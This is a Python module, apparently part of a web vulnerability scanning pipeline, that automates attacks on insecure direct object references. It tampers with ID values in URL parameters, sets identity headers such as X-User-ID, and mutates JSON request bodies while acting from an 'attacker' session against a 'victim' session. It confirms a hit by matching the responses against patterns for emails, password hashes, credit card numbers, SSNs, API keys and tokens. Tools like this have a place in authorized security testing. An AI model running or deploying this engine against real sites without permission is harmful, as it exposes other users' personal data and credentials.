#!/usr/bin/env python3
# engines/idor_engine.py — Advanced IDOR Engine v6
# Multi-session, header-based, JSON mutation, proper confirmation
# MilkyWay Intelligence | Author: Sharlix

import os
import re
import json
import time
import hashlib
import threading
import urllib.request
import urllib.parse
import urllib.error
from engines.param_intel import ParamIntel, classify_json_body

# Patterns that confirm real IDOR (personal data in response)
PERSONAL_PATTERNS = [
    (r'"email"\s*:\s*"[^"@]+@[^"]{3,}"',       "email",          "critical"),
    (r'"phone"\s*:\s*"[\d\+\-\s\(\)]{7,}"',    "phone",          "critical"),
    (r'"password"\s*:\s*"[^"]{4,}"',            "password_hash",  "critical"),
    (r'"credit_card"\s*:\s*"[\d\*\-]{13,}"',   "credit_card",    "critical"),
    (r'"ssn"\s*:\s*"[\d\-]{9,}"',              "ssn",            "critical"),
    (r'"api_key"\s*:\s*"[A-Za-z0-9_\-]{16,}"', "api_key",        "critical"),
    (r'"secret"\s*:\s*"[^"]{8,}"',             "secret",         "high"),
    (r'"address"\s*:\s*"[^"]{10,}"',           "address",        "high"),
    (r'"dob"\s*:\s*"[\d\-\/]{6,}"',            "dob",            "high"),
    (r'"role"\s*:\s*"admin"',                  "admin_role",     "critical"),
    (r'"is_admin"\s*:\s*true',                 "admin_flag",     "critical"),
    (r'"balance"\s*:\s*\d+',                   "balance",        "high"),
    (r'"token"\s*:\s*"[A-Za-z0-9_\-\.]{20,}"', "token",          "critical"),
    (r'"username"\s*:\s*"[^"]{2,}"',           "username",       "medium"),
]

IDOR_PARAM_NAMES = re.compile(
    r'[?&](id|user_id|uid|account_id|profile_id|order_id|invoice_id|'
    r'document_id|file_id|record_id|item_id|pid|cid|eid|tid|rid|bid|vid|sid|'
    r'object_id|resource_id|userId|accountId|orderId|profileId|ref_id)=([^&]+)',
    re.IGNORECASE
)

# HTTP headers that might carry user identity (for header-based IDOR)
IDOR_HEADERS = [
    "X-User-ID", "X-Account-ID", "X-User-Id",
    "X-Auth-User", "X-Auth-ID", "X-Forwarded-User",
    "User-ID", "Account-ID",
]


class IDOREngine:
    """
    Advanced IDOR Engine v6.
    
    Tests:
    1. URL parameter IDOR (numeric, UUID)
    2. JSON body IDOR (mutation)
    3. Header-based IDOR (X-User-ID)
    4. Multi-session (User A vs User B)
    
    Confirms with: personal data patterns, different response content
    Reports: true positives only (no 148 FP dumps)
    """

    def __init__(self, pipeline):
        self.p     = pipeline
        self.log   = pipeline.log
        self.intel = ParamIntel()
        self._lock = threading.Lock()

        # Session contexts
        self.session_a = self._build_session("cookie_a")  # attacker
        self.session_b = self._build_session("cookie_b")  # victim

    def _build_session(self, cookie_arg: str) -> dict:
        """Build session headers from args."""
        cookie = getattr(self.p.args, cookie_arg, None) or \
                 getattr(self.p.args, "cookie", None) or ""
        headers = {"User-Agent": self.p.bypass.ua(), "Accept": "application/json, */*"}
        if cookie:
            headers["Cookie"] = cookie
        return headers

    def run(self):
        urls     = self.p.files.get("urls","")
        out      = os.path.join(self.p.out, f"{self.p.prefix}_idor_v6.txt")
        found    = 0

        if not os.path.isfile(urls):
            self.log.warn("IDOR: no URLs"); return

        all_urls = self._load_urls(urls)
        self.log.info(f"IDOR: {len(all_urls)} URLs, prioritizing by param risk")

        # Step 1: Prioritize URLs by param risk
        prioritized = self.intel.prioritize_urls(all_urls)
        idor_targets = [(url, a) for url, a in prioritized
                        if a["highest_risk"] in ("critical", "high")]

        self.log.info(f"IDOR: {len(idor_targets)} high-risk targets identified")

        # Step 2: Test each target
        seen_patterns = set()
        for url, analysis in idor_targets[:80]:
            # Normalize URL pattern to avoid redundant testing
            pattern = self._url_pattern(url)
            if pattern in seen_patterns:
                continue
            seen_patterns.add(pattern)

            for param_info in analysis["params"]:
                if param_info["risk"] not in ("critical", "high"):
                    continue
                if param_info["attack_type"] != "idor":
                    continue

                result = self._test_url_idor(url, param_info["name"], param_info["value"])
                if result:
                    sev, detail, evidence = result
                    line = f"IDOR_CONFIRMED: {url} | param={param_info['name']} | {detail}"
                    with open(out, "a") as f:
                        f.write(line + "\n")

                    self.p.add_finding(
                        severity  = sev,
                        vuln_type = "IDOR",
                        url       = url,
                        detail    = detail,
                        tool      = "idor-engine",
                        payload   = f"param={param_info['name']} changed to victim_id",
                        response  = evidence[:200],
                    )
                    found += 1
                    break  # One confirmed IDOR per URL pattern is enough

            # Step 3: Header-based IDOR
            header_result = self._test_header_idor(url)
            if header_result:
                sev, detail, evidence = header_result
                with open(out, "a") as f:
                    f.write(f"IDOR_HEADER: {url} | {detail}\n")
                self.p.add_finding(
                    severity  = sev,
                    vuln_type = "IDOR",
                    url       = url,
                    detail    = detail,
                    tool      = "idor-header",
                )
                found += 1

        # Step 4: JSON body IDOR (for API endpoints)
        api_urls = [u for u, _ in prioritized if "/api/" in u][:30]
        for url in api_urls:
            result = self._test_json_idor(url)
            if result:
                sev, detail = result
                with open(out, "a") as f:
                    f.write(f"IDOR_JSON: {url} | {detail}\n")
                self.p.add_finding(
                    severity  = sev,
                    vuln_type = "IDOR",
                    url       = url,
                    detail    = detail,
                    tool      = "idor-json",
                )
                found += 1

        self.log.success(f"IDOR: {found} confirmed findings → {os.path.basename(out)}")

    def _test_url_idor(self, url: str, param: str, value: str) -> tuple:
        """
        Test URL parameter IDOR.
        Returns (severity, detail, evidence) or None.
        
        Requires: different response body with personal data patterns.
        No more '148 candidates' FP dump.
        """
        # Get own baseline
        baseline = self._fetch(url, self.session_a)
        if not baseline or baseline.get("status") not in (200, 201):
            return None
        baseline_body = baseline.get("body","")
        baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()

        # Generate test values
        test_vals = self._generate_test_ids(value)

        for test_val in test_vals:
            test_url = self._inject_param(url, param, value, test_val)
            if test_url == url:
                continue

            resp = self._fetch(test_url, self.session_a)
            if not resp or resp.get("status") not in (200, 201):
                continue

            body      = resp.get("body","")
            body_hash = hashlib.md5(body.encode()).hexdigest()

            if body_hash == baseline_hash or len(body) < 30:
                continue

            # Multi-session test: if User B session available, compare
            if self.session_b.get("Cookie"):
                resp_b = self._fetch(url, self.session_b)
                if resp_b:
                    b_body = resp_b.get("body","")
                    # Check if attacker response matches victim's data
                    if self._responses_match(body, b_body):
                        return ("critical",
                                f"Multi-session IDOR confirmed: attacker sees victim data "
                                f"(param={param} victim_val={test_val})",
                                body[:300])

            # Single-session: look for personal data patterns
            for pattern, data_type, severity in PERSONAL_PATTERNS:
                match = re.search(pattern, body, re.IGNORECASE)
                if match and not re.search(pattern, baseline_body, re.IGNORECASE):
                    detail = (f"Exposes {data_type} via param={param} "
                              f"(tested_id={test_val}) | evidence: {match.group()[:80]}")
                    return (severity, detail, body[:300])

            # Fallback: significantly different JSON with IDs
            own_ids    = set(re.findall(r'"(?:id|user_id|uid)"\s*:\s*"?(\d+)"?', baseline_body))
            target_ids = set(re.findall(r'"(?:id|user_id|uid)"\s*:\s*"?(\d+)"?', body))
            if target_ids and own_ids and target_ids != own_ids:
                detail = (f"Different user IDs in response: tested_id={test_val} "
                          f"param={param} | own={own_ids} target={target_ids}")
                return ("high", detail, body[:300])

        return None

    def _test_header_idor(self, url: str) -> tuple:
        """Test if X-User-ID or similar headers allow IDOR."""
        baseline = self._fetch(url, self.session_a)
        if not baseline or baseline.get("status") != 200:
            return None
        baseline_body = baseline.get("body","")

        for header_name in IDOR_HEADERS:
            # Try with a different user ID in header
            test_headers = dict(self.session_a)
            test_headers[header_name] = "1"  # Try admin/first user

            resp = self._fetch(url, test_headers)
            if not resp or resp.get("status") != 200:
                continue

            body = resp.get("body","")
            if len(body) < 30 or body == baseline_body:
                continue

            for pattern, data_type, severity in PERSONAL_PATTERNS[:6]:
                match = re.search(pattern, body, re.IGNORECASE)
                if match and not re.search(pattern, baseline_body, re.IGNORECASE):
                    return (severity,
                            f"Header-based IDOR via {header_name}: exposes {data_type}",
                            body[:200])

        return None

    def _test_json_idor(self, url: str) -> tuple:
        """Test JSON POST body for IDOR via field mutation."""
        # First GET to understand response shape
        baseline = self._fetch(url, self.session_a)
        if not baseline:
            return None

        # Try common JSON bodies with IDOR fields
        idor_bodies = [
            {"user_id": 1}, {"userId": 1}, {"account_id": 1},
            {"id": 1, "action": "view"},
            {"user_id": 1, "type": "profile"},
        ]

        for body_data in idor_bodies:
            resp = self._post_json(url, body_data, self.session_a)
            if not resp or resp.get("status") not in (200, 201):
                continue

            body = resp.get("body","")
            for pattern, data_type, severity in PERSONAL_PATTERNS[:8]:
                if re.search(pattern, body, re.IGNORECASE):
                    detail = (f"JSON body IDOR: {body_data} → exposes {data_type}")
                    return (severity, detail)

        return None

    def _generate_test_ids(self, value: str) -> list:
        """Generate test ID values to try."""
        if value.isdigit():
            v = int(value)
            return [str(v+1), str(v+2), str(max(1, v-1)), "1", "2", "3", "100"]
        elif len(value) == 36 and "-" in value:
            # UUID-like
            return [
                "00000000-0000-0000-0000-000000000001",
                "00000000-0000-0000-0000-000000000002",
            ]
        return [value + "1", "1", "admin"]

    def _inject_param(self, url: str, param: str, old_val: str, new_val: str) -> str:
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if param in qs:
                qs[param] = [new_val]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                return urllib.parse.urlunparse(parsed._replace(query=new_query))
        except Exception:
            pass
        return url

    def _url_pattern(self, url: str) -> str:
        """Normalize URL to pattern (replace numeric values with {N})."""
        return re.sub(r'=\d+', '={N}', url)

    def _responses_match(self, body_a: str, body_b: str) -> bool:
        """Check if two responses contain similar personal data."""
        for pattern, _, _ in PERSONAL_PATTERNS[:6]:
            match_a = re.search(pattern, body_a, re.IGNORECASE)
            match_b = re.search(pattern, body_b, re.IGNORECASE)
            if match_a and match_b and match_a.group() == match_b.group():
                return True
        return False

    def _load_urls(self, path: str) -> list:
        if not os.path.isfile(path): return []
        with open(path) as f:
            return [l.strip() for l in f if l.strip() and l.startswith("http")]

    def _fetch(self, url: str, session: dict, timeout: int = 8) -> dict:
        try:
            req = urllib.request.Request(url, headers=session)
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read(50000).decode("utf-8", errors="ignore")
            return {"status": resp.status, "body": body}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": ""}
        except Exception:
            return None

    def _post_json(self, url: str, data: dict, session: dict, timeout=8) -> dict:
        try:
            body = json.dumps(data).encode()
            headers = dict(session)
            headers["Content-Type"] = "application/json"
            headers["Accept"]       = "application/json"
            req = urllib.request.Request(url, data=body, headers=headers, method="POST")
            resp = urllib.request.urlopen(req, timeout=timeout)
            resp_body = resp.read(10000).decode("utf-8", errors="ignore")
            return {"status": resp.status, "body": resp_body}
        except urllib.error.HTTPError as e:
            try: body_e = e.read(2000).decode("utf-8", errors="ignore")
            except: body_e = ""
            return {"status": e.code, "body": body_e}
        except Exception:
            return None
